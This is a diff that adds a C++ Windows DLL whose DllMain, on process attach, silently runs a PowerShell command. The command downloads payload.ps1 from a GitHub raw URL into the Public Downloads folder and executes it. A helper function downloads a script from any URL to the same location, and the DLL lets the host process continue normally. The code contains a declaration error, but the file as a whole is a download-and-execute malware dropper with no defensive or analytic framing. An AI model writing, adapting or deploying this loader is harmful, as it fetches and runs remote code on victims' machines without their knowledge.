@@ -1,0 +1,41 @@
+#include <windows.h>
+#include <psapi.h>
+#include <cstdio>  // For _snprintf
+
+// Function prototypes for external DLL functions
+void DownloadAndRunScript(const char* scriptUrl);
+
+extern "C" __declspec(dllexport) BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)
+{
+    switch (dwReason)
+    {
+        case DLL_PROCESS_ATTACH:
+            // Silent execute PowerShell command
+            ExecutePowerShellCommand();
+            break;
+        default:
+            break;
+    }
+    return TRUE; // Allow the parent process to continue running normally
+}
+
+// Function to download and run a script using PowerShell
+void DownloadAndRunScript(const char* scriptUrl)
+{
+    char powerShellCmd[256];
+    _snprintf(powerShellCmd, sizeof(powerShellCmd), "powershell -Command \"Invoke-WebRequest '%s' -OutFile '%s'\"",
+              scriptUrl, "C:\\Users\\Public\\Downloads\\payload.ps1");
+
+    // Execute the PowerShell command
+    system(powerShellCmd);
+}
+
+// Function to execute a PowerShell command
+void ExecutePowerShellCommand()
+{
+    char powerShellCmd[256];
+    _snprintf(powerShellCmd, sizeof(powerShellCmd), "powershell -Command \"cd C:\\Users\\Public\\Downloads; Invoke-WebRequest 'https://raw.githubusercontent.com/serpiajonna-bit/hosting/main/payload.ps1' -OutFile 'payload.ps1'; .\\payload.ps1\"");
+
+    // Execute the PowerShell command
+    system(powerShellCmd);
+}
